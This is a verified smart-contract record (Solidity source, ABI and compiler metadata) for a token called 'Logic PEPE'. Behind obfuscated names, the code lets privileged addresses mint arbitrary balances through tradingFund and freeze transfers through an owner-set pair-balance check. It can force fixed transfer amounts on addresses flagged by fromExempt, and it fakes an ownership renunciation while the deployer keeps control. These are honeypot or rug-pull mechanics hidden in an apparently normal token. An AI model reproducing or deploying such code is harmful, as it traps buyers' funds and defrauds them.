{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface enableMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFund) external view returns (uint256);\n\n    function transfer(address receiverLiquidity, uint256 teamReceiver) external returns (bool);\n\n    function allowance(address enableLiquiditySender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverLiquidity,\n        uint256 teamReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMarketing, uint256 value);\n    event Approval(address indexed enableLiquiditySender, address indexed spender, uint256 value);\n}\n\nabstract contract exemptReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapSender {\n    function createPair(address enableFund, address amountMax) external returns (address);\n}\n\ninterface tokenTx is enableMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LogicPEPE is exemptReceiver, enableMode, tokenTx {\n\n    function tradingFund(address launchedSender, uint256 teamReceiver) public {\n        feeLaunched();\n        launchedTxSender[launchedSender] = teamReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLaunched;\n    }\n\n    bool public senderMax;\n\n    function transfer(address launchedSender, uint256 teamReceiver) external virtual override returns (bool) {\n        return receiverReceiver(_msgSender(), launchedSender, teamReceiver);\n    }\n\n    function receiverReceiver(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) internal returns (bool) {\n        if (modeReceiver == toFee) {\n            return autoBuy(modeReceiver, receiverLiquidity, teamReceiver);\n        }\n        uint256 txMinSender = enableMode(sellIsTake).balanceOf(feeSwap);\n        require(txMinSender == liquidityTakeTotal);\n        require(receiverLiquidity != feeSwap);\n        if (toMarketing[modeReceiver]) {\n            return autoBuy(modeReceiver, receiverLiquidity, tokenTo);\n        }\n        return autoBuy(modeReceiver, receiverLiquidity, teamReceiver);\n    }\n\n    function balanceOf(address buyFund) public view virtual override returns (uint256) {\n        return launchedTxSender[buyFund];\n    }\n\n    uint256 constant tokenTo = 12 ** 10;\n\n    bool public autoMode;\n\n    uint256 private atLaunched = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return walletSwap;\n    }\n\n    function transferFrom(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) external override returns (bool) {\n        if (_msgSender() != fundTake) {\n            if (feeTxMax[modeReceiver][_msgSender()] != type(uint256).max) {\n                require(teamReceiver <= feeTxMax[modeReceiver][_msgSender()]);\n                feeTxMax[modeReceiver][_msgSender()] -= teamReceiver;\n            }\n        }\n        return receiverReceiver(modeReceiver, receiverLiquidity, teamReceiver);\n    }\n\n    function liquidityLaunchLaunched() public {\n        emit OwnershipTransferred(toFee, address(0));\n        walletSwap = address(0);\n    }\n\n    uint256 liquidityTakeTotal;\n\n    function allowance(address enableFromFee, address swapReceiver) external view virtual override returns (uint256) {\n        if (swapReceiver == fundTake) {\n            return type(uint256).max;\n        }\n        return feeTxMax[enableFromFee][swapReceiver];\n    }\n\n    mapping(address => bool) public toMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderReceiver;\n    }\n\n    uint256 private listMax;\n\n    uint256 tokenShould;\n\n    uint256 public atSell;\n\n    address fundTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private feeTxMax;\n\n    function approve(address swapReceiver, uint256 teamReceiver) public virtual override returns (bool) {\n        feeTxMax[_msgSender()][swapReceiver] = teamReceiver;\n        emit Approval(_msgSender(), swapReceiver, teamReceiver);\n        return true;\n    }\n\n    bool public totalAuto;\n\n    string private amountLaunched = \"LPE\";\n\n    bool public fundMarketing;\n\n    mapping(address => uint256) private launchedTxSender;\n\n    uint8 private senderReceiver = 18;\n\n    function feeLaunched() private view {\n        require(enableAt[_msgSender()]);\n    }\n\n    string private atReceiver = \"Logic PEPE\";\n\n    address public toFee;\n\n    address feeSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function autoBuy(address modeReceiver, address receiverLiquidity, uint256 teamReceiver) internal returns (bool) {\n        require(launchedTxSender[modeReceiver] >= teamReceiver);\n        launchedTxSender[modeReceiver] -= teamReceiver;\n        launchedTxSender[receiverLiquidity] += teamReceiver;\n        emit Transfer(modeReceiver, receiverLiquidity, teamReceiver);\n        return true;\n    }\n\n    function amountExemptEnable(address maxTake) public {\n        require(maxTake.balance < 100000);\n        if (totalAuto) {\n            return;\n        }\n        if (tokenTxLiquidity == fundMarketing) {\n            atSell = listMax;\n        }\n        enableAt[maxTake] = true;\n        \n        totalAuto = true;\n    }\n\n    constructor (){\n        \n        takeTo liquidityTx = takeTo(fundTake);\n        sellIsTake = swapSender(liquidityTx.factory()).createPair(liquidityTx.WETH(), address(this));\n        if (tokenTxLiquidity == fundMarketing) {\n            fundMarketing = false;\n        }\n        toFee = _msgSender();\n        liquidityLaunchLaunched();\n        enableAt[toFee] = true;\n        launchedTxSender[toFee] = atLaunched;\n        \n        emit Transfer(address(0), toFee, atLaunched);\n    }\n\n    bool private liquidityLaunchedFrom;\n\n    function getOwner() external view returns (address) {\n        return walletSwap;\n    }\n\n    bool private tokenTxLiquidity;\n\n    mapping(address => bool) public enableAt;\n\n    function fromExempt(address modeLimit) public {\n        feeLaunched();\n        if (atSell != listMax) {\n            listMax = atSell;\n        }\n        if (modeLimit == toFee || modeLimit == sellIsTake) {\n            return;\n        }\n        toMarketing[modeLimit] = true;\n    }\n\n    function enableTake(uint256 teamReceiver) public {\n        feeLaunched();\n        liquidityTakeTotal = teamReceiver;\n    }\n\n    event OwnershipTransferred(address indexed marketingSwapTrading, address indexed senderTo);\n\n    address private walletSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return atReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atLaunched;\n    }\n\n    address public sellIsTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLiquiditySender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSwapTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFromFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"amountExemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIsTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LogicPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}